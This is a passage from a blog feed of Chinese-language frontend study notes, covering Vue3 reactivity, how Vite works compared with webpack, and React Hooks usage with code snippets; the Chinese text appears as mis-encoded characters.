dep.depend()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.get(target, key, receiver) <span class="comment">// åå°„ï¼Œåšè¯¥å¯¹è±¡æœ¬è¯¥åšçš„äº‹</span></span><br><span class="line">  &#125;,</span><br><span class="line">  set (target, key, value, receiver) &#123;</span><br><span class="line">    <span class="keyword">const</span> dep = getDep(target, key)</span><br><span class="line">    dep.notify()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.set(target, key, receiver)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reactive</span>(<span class="params">raw</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Proxy</span>(raw, reactiveHandlers)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.bilibili.com/video/BV1rC4y187Vw?spm_id_from=333.788.videopod.episodes&amp;vd_source=2afb712305742eec14a61ccd3d5b51c9&amp;p=5" target="_blank" rel="noopener">è·Ÿå°¤é›¨æºªä¸€èµ·è§£è¯»Vue3æºç </a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Vite</title>
      <link href="/2025/02/05/vite/"/>
      <url>/2025/02/05/vite/</url>
      <content type="html"><![CDATA[<h3 id="1-æ‰“åŒ…å·¥å…·"><a href="#1-æ‰“åŒ…å·¥å…·" class="headerlink" title="1. æ‰“åŒ…å·¥å…·"></a>1. æ‰“åŒ…å·¥å…·</h3><ul><li><p>webpack / rollup / browserify<br>åˆé˜¶æ®µçš„æ‰“åŒ…å·¥å…·ï¼Œä¸“æ³¨äºæ‰“åŒ…ï¼ŒæŠ½è±¡å±‚æ¬¡ä½ã€‚éœ€è¦ä¾é å¾ˆå¤šç¬¬ä¸‰æ–¹æ’ä»¶æ¥é…ç½®è¿è¡Œ</p></li><li><p>vue-cli / create react app / parcel / CRA<br>è„šæ‰‹æ¶ï¼Œæ›´é«˜æŠ½è±¡å±‚æ¬¡çš„å·¥å…·ï¼Œä¸“æ³¨äºæä¾›ä¸€ä¸ªå®Œæ•´åº”ç”¨è§£å†³æ–¹æ¡ˆ<br>ç¼ºç‚¹ï¼šåƒä¸€ä¸ªåºå¤§çš„é»‘ç›’ï¼Œå½“ä½ éœ€è¦è‡ªå®šä¹‰çš„å®šåˆ¶æ—¶ï¼Œä¼šæ¯”è¾ƒç—›è‹¦</p></li><li><p>vite<br>cli: ä¸“æ³¨äºåº”ç”¨ï¼ŒæŠ½è±¡å±‚æ¬¡é«˜<br>api: ä¸“æ³¨ä¸æ”¯æŒä¸Šå±‚æ¡†æ¶ï¼ŒæŠ½è±¡å±‚æ¬¡ä¸­</p></li></ul><p><br></p><h3 id="2-Viteç®€ä»‹"><a href="#2-Viteç®€ä»‹" class="headerlink" title="2. Viteç®€ä»‹"></a>2. Viteç®€ä»‹</h3><p>Viteæ˜¯æ–°ä¸€ä»£çš„å‰ç«¯æ„å»ºå·¥å…·ï¼Œåˆ©ç”¨æµè§ˆå™¨ESMç‰¹æ€§å¯¼å…¥ç»„ç»‡ä»£ç ï¼Œåœ¨æœåŠ¡å™¨ç«¯æŒ‰éœ€ç¼–è¯‘è¿”å›ï¼Œå®Œå…¨è·³è¿‡äº†æ‰“åŒ…è¿™ä¸ªæ¦‚å¿µï¼ŒæœåŠ¡å™¨éšèµ·éšç”¨ã€‚</p><p><br></p><h3 id="3-Vite-åŸç†"><a href="#3-Vite-åŸç†" class="headerlink" title="3. Vite åŸç†"></a>3. Vite åŸç†</h3><p>åˆ©ç”¨æµè§ˆå™¨ç°åœ¨å·²ç»æ”¯æŒES6çš„import,ç¢°è§importå°±ä¼šå‘é€ä¸€ä¸ªHTTPè¯·æ±‚å»åŠ è½½æ–‡ä»¶ã€‚Viteå¯åŠ¨ä¸€ä¸ª koa æœåŠ¡å™¨æ‹¦æˆªè¿™äº›è¯·æ±‚ï¼Œå¹¶åœ¨åç«¯è¿›è¡Œç›¸åº”çš„å¤„ç†å°†é¡¹ç›®ä¸­ä½¿ç”¨çš„æ–‡ä»¶é€šè¿‡ç®€å•çš„åˆ†è§£ä¸æ•´åˆï¼Œç„¶åå†ä»¥ESMæ ¼å¼è¿”å›è¿”å›ç»™æµè§ˆå™¨ã€‚Viteæ•´ä¸ªè¿‡ç¨‹ä¸­æ²¡æœ‰å¯¹æ–‡ä»¶è¿›è¡Œæ‰“åŒ…ç¼–è¯‘ï¼Œåšåˆ°äº†çœŸæ­£çš„æŒ‰éœ€åŠ è½½ï¼Œæ‰€ä»¥å…¶è¿è¡Œé€Ÿåº¦æ¯”åŸå§‹çš„webpackå¼€å‘ç¼–è¯‘é€Ÿåº¦å¿«å‡ºè®¸å¤šï¼</p><p><em>æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</em></p><ol><li><p>å½“å£°æ˜ä¸€ä¸ª scriptæ ‡ç­¾ç±»å‹ä¸º module æ—¶,å¦‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"module"</span> src=<span class="string">"/src/main.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>å½“æµè§ˆå™¨è§£æèµ„æºæ—¶ï¼Œä¼šå¾€å½“å‰åŸŸåå‘èµ·ä¸€ä¸ªGETè¯·æ±‚main.jsæ–‡ä»¶</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App.vue'</span></span><br><span class="line">createApp(App).mount(<span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure></li><li><p>è¯·æ±‚åˆ°äº†main.jsæ–‡ä»¶ï¼Œä¼šæ£€æµ‹åˆ°å†…éƒ¨å«æœ‰importå¼•å…¥çš„åŒ…ï¼Œåˆä¼šimport å¼•ç”¨å‘èµ·HTTPè¯·æ±‚è·å–æ¨¡å—çš„å†…å®¹æ–‡ä»¶ï¼Œå¦‚App.vueã€vueæ–‡ä»¶</p></li></ol><p><br></p><h3 id="4-webpack-åŸç†"><a href="#4-webpack-åŸç†" class="headerlink" title="4. webpack åŸç†"></a>4. webpack åŸç†</h3><p>ä¼ ç»Ÿçš„æ‰“åŒ…å·¥å…·å¦‚Webpackæ˜¯å…ˆè§£æä¾èµ–ã€æ‰“åŒ…æ„å»ºå†å¯åŠ¨å¼€å‘æœåŠ¡å™¨ï¼ŒDev Server å¿…é¡»ç­‰å¾…æ‰€æœ‰æ¨¡å—æ„å»ºå®Œæˆï¼Œå½“æˆ‘ä»¬ä¿®æ”¹äº† bundleæ¨¡å—ä¸­çš„ä¸€ä¸ªå­æ¨¡å—ï¼Œ æ•´ä¸ª bundle æ–‡ä»¶éƒ½ä¼šé‡æ–°æ‰“åŒ…ç„¶åè¾“å‡ºã€‚é¡¹ç›®åº”ç”¨è¶Šå¤§ï¼Œå¯åŠ¨æ—¶é—´è¶Šé•¿ã€‚</p><p><br></p><h3 id="5-çƒ­æ›´æ–°"><a href="#5-çƒ­æ›´æ–°" class="headerlink" title="5. çƒ­æ›´æ–°"></a>5. çƒ­æ›´æ–°</h3><p>é€šè¿‡WebSocketåˆ›å»ºæµè§ˆå™¨å’ŒæœåŠ¡å™¨çš„é€šä¿¡ç›‘å¬æ–‡ä»¶çš„æ”¹å˜ï¼Œå½“æ–‡ä»¶è¢«ä¿®æ”¹æ—¶ï¼ŒæœåŠ¡ç«¯å‘é€æ¶ˆæ¯é€šçŸ¥å®¢æˆ·ç«¯ä¿®æ”¹ç›¸åº”çš„ä»£ç ï¼Œå®¢æˆ·ç«¯å¯¹åº”ä¸åŒçš„æ–‡ä»¶è¿›è¡Œä¸åŒçš„æ“ä½œçš„æ›´æ–°ã€‚</p><p><br></p><h3 id="6-æœ€æ–°ç‰ˆVite"><a href="#6-æœ€æ–°ç‰ˆVite" class="headerlink" title="6. æœ€æ–°ç‰ˆVite"></a>6. æœ€æ–°ç‰ˆVite</h3><h4 id="6-1-Viteå½“å‰çš„é—®é¢˜"><a href="#6-1-Viteå½“å‰çš„é—®é¢˜" class="headerlink" title="6.1 Viteå½“å‰çš„é—®é¢˜"></a>6.1 Viteå½“å‰çš„é—®é¢˜</h4><ul><li>èŒè´£é‡å çš„ä¾èµ–: esbuild, rollup, swcåº•å±‚ä¸åŒçš„åŒ…æœ‰é‡å å’Œåå¤å¤„ç†çš„åœ°æ–¹</li><li>ç”Ÿäº§æ„å»ºé€Ÿåº¦</li><li>Unbundled ESM åœ¨å¤§å‹é¡¹ç›®ä¸­çš„æ€§èƒ½ç“¶é¢ˆ</li><li>é«˜é˜¶åŠŸèƒ½ï¼Œå¦‚æè‡´æ‹†åŒ…ï¼Œå¢é‡æ„å»ºï¼ŒModule Federation</li></ul><p><br></p><h4 id="6-2-ç¢ç‰‡åŒ–çš„å·¥å…·é“¾"><a href="#6-2-ç¢ç‰‡åŒ–çš„å·¥å…·é“¾" class="headerlink" title="6.2 ç¢ç‰‡åŒ–çš„å·¥å…·é“¾"></a>6.2 ç¢ç‰‡åŒ–çš„å·¥å…·é“¾</h4><p>JSå·¥å…·ç”Ÿæ€åœ¨æ¯ä¸€ä¸ªå±‚é¢éƒ½éå¸¸çš„ç¢ç‰‡åŒ–</p><ul><li>Parsers: babel / acorn / esbuild / flow / TS / swc / uglify-js</li><li>Transform: babel / esbuild / swc / sucrase / TS</li><li>Test runner: mocha / jest / jasmine / tape / ava</li><li>Linter: jshint / eslint / biome </li><li>formatter: eslint / prettier</li><li>bundles: webpack / rollup / esbuild / parcel </li><li>monorepo tools: nx / turborepo / rush / lerna / lega / wireit</li></ul><p><br></p><p>ç¢ç‰‡åŒ–å¯¼è‡´çš„ç§ç§é—®é¢˜</p><ul><li>é€‰æ‹©å›°éš¾ + å¤æ‚åº¦çˆ†ç‚¸</li><li>ä¸€äº›å·¥å…·äº’ç›¸ä¸å…¼å®¹</li><li>ä¸åŒå·¥å…·åå¤ parse / ç¼–è¯‘å¯¼è‡´çš„æµªè´¹</li><li>é‡å¤å´åˆå„ä¸ç›¸åŒçš„é…ç½®</li><li>å¤§é‡æ—¶é—´æµªè´¹åœ¨æ­é…å’Œè°ƒè¯•å·¥å…·ä¸Š</li></ul><p><br></p><h4 id="6-3-Vite-Plus"><a href="#6-3-Vite-Plus" class="headerlink" title="6.3 Vite Plus"></a>6.3 Vite Plus</h4><p>Coming in 2025</p><ul><li>Dev / Build(Vite / Rolldown)ï¼Œä¸å†ä¾èµ–esbuild, rollup, swc</li><li>Test / Bench(Vitest)</li><li>Lint / Format<br>â€¦</li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.cn/post/7064853960636989454" target="_blank" rel="noopener">æ·±å…¥ç†è§£Viteæ ¸å¿ƒåŸç†</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React Hooks ç”¨æ³•</title>
      <link href="/2025/01/29/React%20Hooks/"/>
      <url>/2025/01/29/React%20Hooks/</url>
      <content type="html"><![CDATA[<blockquote><p>è¿™æ˜¯ä¸€ä»½React Hooks æ–°å®˜ç½‘ç¬”è®°ã€‚<br>ä¸å¾—ä¸æ„Ÿå¹ React çš„å‡½æ•°ç»„ä»¶åŠ ä¸Š Hooksï¼ˆhooksæœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°ï¼‰ï¼Œå¯¥å¯¥å‡ ä¸ªapiå°±æ»¡è¶³äº†å‰ç«¯é¡µé¢æ‰€æœ‰é€»è¾‘äº¤äº’ã€‚Vueå•ŠVueï¼Œæ‰é˜Ÿäº†å•Š</p></blockquote><p><br></p><h3 id="1-React-å“²å­¦"><a href="#1-React-å“²å­¦" class="headerlink" title="1. React å“²å­¦"></a>1. React å“²å­¦</h3><h4 id="1-1-ç»„ä»¶æ˜¯ä¸ªçº¯å‡½æ•°"><a href="#1-1-ç»„ä»¶æ˜¯ä¸ªçº¯å‡½æ•°" class="headerlink" title="1.1 ç»„ä»¶æ˜¯ä¸ªçº¯å‡½æ•°"></a>1.1 ç»„ä»¶æ˜¯ä¸ªçº¯å‡½æ•°</h4><p>ä¸€ä¸ªç»„ä»¶å¿…é¡»æ˜¯çº¯ç²¹çš„ï¼ŒReact çš„å‡½æ•°ç»„ä»¶åªåº”è¯¥åšä¸€ä»¶äº‹æƒ…ï¼šè¿”å›ç»„ä»¶çš„ HTML ä»£ç ï¼Œè€Œæ²¡æœ‰å…¶ä»–çš„åŠŸèƒ½ã€‚ä¸åº”è¯¥è®©å¤–éƒ¨å˜é‡æ±¡æŸ“ç»„ä»¶<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ğŸ”´é”™è¯¯ç¤ºä¾‹ï¼šå—guestå½±å“ï¼Œå¤šæ¬¡è°ƒç”¨è¿™ä¸ªç»„ä»¶ï¼Œä¼šäº§ç”Ÿä¸åŒçš„JSXï¼Œä¸èƒ½è¿™æ ·å†™</span></span><br><span class="line"><span class="keyword">let</span> guest = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  guest = guest + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;guest&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-2-Hooks"><a href="#1-2-Hooks" class="headerlink" title="1.2 Hooks"></a>1.2 Hooks</h4><p>React Hooks çš„æ„æ€æ˜¯ï¼Œç»„ä»¶å†™æˆçº¯å‡½æ•°ï¼Œå¦‚æœéœ€è¦å¤–éƒ¨åŠŸèƒ½å’Œå‰¯ä½œç”¨ï¼ˆç»„ä»¶çŠ¶æ€stateã€å…·æœ‰å‰¯ä½œç”¨çš„æ“ä½œ,å¦‚è·å–æ•°æ®ã€äº‹ä»¶ç›‘å¬ã€æ”¹å˜DOMï¼‰ï¼Œå°±ç”¨é’©å­æŠŠå¤–éƒ¨ä»£ç â€é’©â€è¿›æ¥ã€‚<br>Hooksæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°ã€‚ä¸€ä¸ªåº”ç”¨ç”±ä¸€ä¸ªä¸ªçº¯å‡½æ•°é“¾æ¥è€Œæˆã€‚<br>çœŸçš„å¥½åƒAIç¥ç»ç½‘ç»œï¼Œåº”ç”¨ç”±ä¸€ä¸ªä¸ªèŠ‚ç‚¹ï¼ˆç¥ç»å…ƒï¼‰è¿æ¥èµ·æ¥ï¼Œæ¯ä¸ªç¥ç»å…ƒä¹‹é—´éƒ½å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªå‡½æ•°<code>a = f(b)</code>ã€‚çº¯å‡½æ•°æœ‰åŠ©äºæœºå™¨ç†è§£ï¼Œæ‰€ä»¥reactå°±æ˜¯ä¸ºAIç”Ÿæˆä»£ç ä½œé“ºå«ï¼Ÿ</p><p><br></p><h4 id="1-3-UI-Tree"><a href="#1-3-UI-Tree" class="headerlink" title="1.3 UI Tree"></a>1.3 UI Tree</h4><p>æ ‘æ˜¯è¡¨ç¤ºå®ä½“ä¹‹é—´å…³ç³»çš„å¸¸è§æ–¹å¼ï¼Œå®ƒä»¬ç»å¸¸ç”¨äºå»ºæ¨¡ UIã€‚<em>æŠŠReactç»„ä»¶ä¹‹é—´çš„åµŒå¥—å…³ç³»ï¼Œçœ‹ä½œä¸€æ£µUI Treeã€‚</em></p><p>é¡¶çº§ç»„ä»¶ä¼šå½±å“å…¶ä¸‹æ‰€æœ‰ç»„ä»¶çš„æ¸²æŸ“æ€§èƒ½ï¼Œè€Œå¶å­ç»„ä»¶é€šå¸¸ä¼šé¢‘ç¹é‡æ–°æ¸²æŸ“ã€‚è¯†åˆ«å®ƒä»¬æœ‰åŠ©äºç†è§£å’Œè°ƒè¯•æ¸²æŸ“æ€§èƒ½é—®é¢˜ã€‚</p><ul><li>åˆæ¬¡æ¸²æŸ“æ—¶, React ä¼šè°ƒç”¨æ ¹ç»„ä»¶ã€‚</li><li>åç»­çš„æ¸²æŸ“ï¼Œå¦‚æœæ›´æ–°åçš„ç»„ä»¶æ˜¯åŒä¸€ä¸ªç»„ä»¶ï¼ŒReact åœ¨åŸç»„ä»¶ä¸Šæ›´æ–°è§¦å‘ã€‚å¦‚æœæ˜¯åˆ«çš„ç»„ä»¶ï¼Œä¼šæ¸²æŸ“æ–°çš„ç»„ä»¶ã€‚</li></ul><p>å¯¹ React æ¥è¯´é‡è¦çš„æ˜¯ç»„ä»¶åœ¨ UI æ ‘ä¸­çš„ä½ç½®,è€Œä¸æ˜¯åœ¨ JSX ä¸­çš„ä½ç½®</p><p><br></p><h3 id="2-Hooks"><a href="#2-Hooks" class="headerlink" title="2. Hooks"></a>2. Hooks</h3><h4 id="2-1-useState"><a href="#2-1-useState" class="headerlink" title="2.1 useState"></a>2.1 useState</h4><ul><li>state å˜é‡ï¼šç”¨äºä¿å­˜æ¸²æŸ“é—´çš„æ•°æ®ã€‚</li><li><p>state setter å‡½æ•°ï¼šæ›´æ–°å˜é‡å¹¶è§¦å‘ React å†æ¬¡æ¸²æŸ“ç»„ä»¶ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [index, setIndex] = useState(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></li><li><p><em>å¿«ç…§çš„çŠ¶æ€</em><br>æ¯æ¬¡æ¸²æŸ“ï¼ŒReactéƒ½ä¼šä¸ºä½ æä¾›è¿™æ¬¡æ¸²æŸ“çš„ä¸€å¼ stateå¿«ç…§ã€‚<code>setScore</code>ä¼šè¯·æ±‚ä¸€ä¸ªæ–°çš„é‡æ–°æ¸²æŸ“ï¼Œä½†ä¸ä¼šåœ¨å·²è¿è¡Œçš„ä»£ç ä¸­æ›´æ”¹<code>score</code>çš„å€¼ã€‚æ‰€ä»¥ç¬¬äºŒæ¬¡è°ƒç”¨ <code>setScore(score + 1)</code> æ—¶ï¼Œ<code>score</code> ä»ç„¶æ˜¯ 0ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [score, setScore] = useScore(<span class="number">0</span>)</span><br><span class="line">setScore(score + <span class="number">1</span>) <span class="comment">// score = 0</span></span><br><span class="line">setScore(score + <span class="number">1</span>) <span class="comment">// æ­¤æ—¶ score = 0</span></span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  alert(score) <span class="comment">// score ä¾ç„¶æ˜¯ 0</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯ä»¥ç”¨æ›´æ–°å‡½æ•°å¤„ç†</span></span><br><span class="line">setScore(<span class="function"><span class="params">n</span> =&gt;</span> n + <span class="number">1</span>) <span class="comment">// æ­¤æ—¶ n = 1</span></span><br></pre></td></tr></table></figure></li><li><p>æ›´æ–°å¯¹è±¡state<br>éœ€è¦ç”¨ä¸€ä¸ªå…¨æ–°çš„å¯¹è±¡æ¥æ›´æ–°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [person, setPerson] = useState(&#123; <span class="attr">name</span>: <span class="string">'Niki'</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨...åˆ›å»ºæ–°å¯¹è±¡,æ³¨æ„å±•å¼€è¯­æ³•æ˜¯æµ…å±‚çš„ï¼šå®ƒçš„å¤åˆ¶æ·±åº¦åªæœ‰ä¸€å±‚</span></span><br><span class="line">setPerson(&#123; ...person, <span class="attr">name</span>: <span class="string">'other'</span> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨Immeræ›´ç®€æ´</span></span><br><span class="line">setPerson(<span class="function"><span class="params">person</span> =&gt;</span> &#123; person.name = <span class="string">'other'</span> &#125;)</span><br></pre></td></tr></table></figure></li><li><p>æ›´æ–°æ•°ç»„state</p><ul><li>ä¸èƒ½ä½¿ç”¨: pushã€unshift, pop, shift, splice, arr[i] = ,reverse, sort</li><li>å¯ä»¥ç”¨: concat, [â€¦arr], filter, slice, map</li><li>æ›´æ–°æ•°ç»„å†…çš„å¯¹è±¡<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wrong: è™½ç„¶æ•°ç»„æ˜¯æ–°çš„ï¼Œä½†æ˜¯å…¶å†…éƒ¨å…ƒç´ æœ¬èº«å’Œå…ƒç´ ç»„æ˜¯ç›¸åŒçš„</span></span><br><span class="line"><span class="keyword">const</span> nextList = [...list]</span><br><span class="line">nextList[<span class="number">0</span>].name = <span class="string">'abc'</span></span><br><span class="line">setMyList(nextList)</span><br><span class="line"></span><br><span class="line"><span class="comment">// right: éœ€è¦ç”¨mapæ¥æ›¿æ¢</span></span><br><span class="line">setMyList(list.map(<span class="function"><span class="params">v</span> =&gt;</span> v.id === <span class="number">1</span> ? &#123; ...a, <span class="attr">name</span>: <span class="string">'abc'</span> &#125; : v));</span><br></pre></td></tr></table></figure></li></ul></li><li><p><em>ç­‰åŒäºcomputed</em><br>æ¯æ¬¡æ–°æ¸²æŸ“ï¼Œ<code>selectedItem</code>éƒ½ä¼šä»æ–°æ•°æ®ä¸­ç®—å‡ºæ¥</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [items, setItems] = useState(initialItems);</span><br><span class="line"><span class="keyword">const</span> [selectedId, setSelectedId] = useState(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> selectedItem = items.find(<span class="function"><span class="params">item</span> =&gt;</span></span><br><span class="line">  item.id === selectedId</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p>è°¨æ…æŠŠpropsä½œä¸ºstateçš„åˆå§‹å€¼<br>å¦‚æœçˆ¶ç»„ä»¶æ›´æ–°äº†propsï¼Œ color stateå˜é‡ä¸ä¼šè¢«æ›´æ–°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Message</span>(<span class="params">&#123; messageColor &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [color, setColor] = useState(messageColor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-2-useReducer"><a href="#2-2-useReducer" class="headerlink" title="2.2 useReducer"></a>2.2 useReducer</h4><p>çŠ¶æ€æ›´æ–°é€»è¾‘å¤æ‚æ—¶ï¼ŒæŠŠ<code>useSstate</code>è¿ç§»åˆ°<code>useReducer</code>ï¼ŒæŠŠå®ƒä»¬æ•´åˆåˆ°ä¸€ä¸ªå¤–éƒ¨å‡½æ•°ä¸­ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useReducer &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">const</span> initialTasks = [&#123;<span class="attr">id</span>: <span class="number">0</span>, <span class="attr">text</span>: <span class="string">'å‚è§‚å¡å¤«å¡åšç‰©é¦†'</span>, <span class="attr">done</span>: <span class="literal">true</span>&#125;];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tasksReducer</span>(<span class="params">tasks, action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (action.type === <span class="string">'add'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">      ...tasks,</span><br><span class="line">      &#123;</span><br><span class="line">        id: action.id,</span><br><span class="line">        text: action.text,</span><br><span class="line">      &#125;,</span><br><span class="line">    ];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">App</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [tasks, dispatch] = useReducer(tasksReducer, initialTasks);</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">handleAddTask</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">    dispatch(&#123; <span class="attr">type</span>: <span class="string">'add'</span>, text &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-useContext"><a href="#2-3-useContext" class="headerlink" title="2.3 useContext"></a>2.3 useContext</h4><p>Context å…è®¸çˆ¶ç»„ä»¶å‘å…¶ä¸‹å±‚æ— è®ºå¤šæ·±çš„ä»»ä½•ç»„ä»¶æä¾›ä¿¡æ¯<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createContext, useContext &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> LevelContext = createContext(<span class="number">1</span>); <span class="comment">// åˆ›å»ºcontext</span></span><br><span class="line"><span class="keyword">const</span> level = useContext(LevelContext); <span class="comment">// æŠŠ context ä¼ é€’ç»™ useContext hookæ¥è¯»å–å®ƒ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">Section</span>(<span class="params">&#123; level, children &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &#123;<span class="comment">/* åœ¨çˆ¶ç»„ä»¶ä¸­ï¼Œç”¨ context.Provideræ¥ä¸ºå­ç»„ä»¶æä¾›context */</span>&#125;</span><br><span class="line">    &lt;LevelContext.Provider value=&#123;level&#125;&gt;</span><br><span class="line">      &#123;children&#125;</span><br><span class="line">    &lt;<span class="regexp">/LevelContext.Provider&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ åœ¨å­ç»„ä»¶ä¸­ï¼Œç”¨useContextæ¥è¯»å–å®ƒ</span></span><br><span class="line"><span class="regexp">const level = useContext(LevelContext);</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-Reducer-Context"><a href="#2-4-Reducer-Context" class="headerlink" title="2.4 Reducer + Context"></a>2.4 Reducer + Context</h4><p>ç»“åˆreducerå’ŒContextï¼Œ<em>ç›¸å½“äºvueé‡Œçš„provideå’Œinject</em><br>state å­˜åœ¨äºé¡¶å±‚ç»„ä»¶ä¸­ï¼Œç”± useReducer è¿›è¡Œç®¡ç†ã€‚å­ç»„ä»¶å¯ä»¥è½»æ¾è·å–è·å– stateæ•°æ® å’Œ dispatchã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 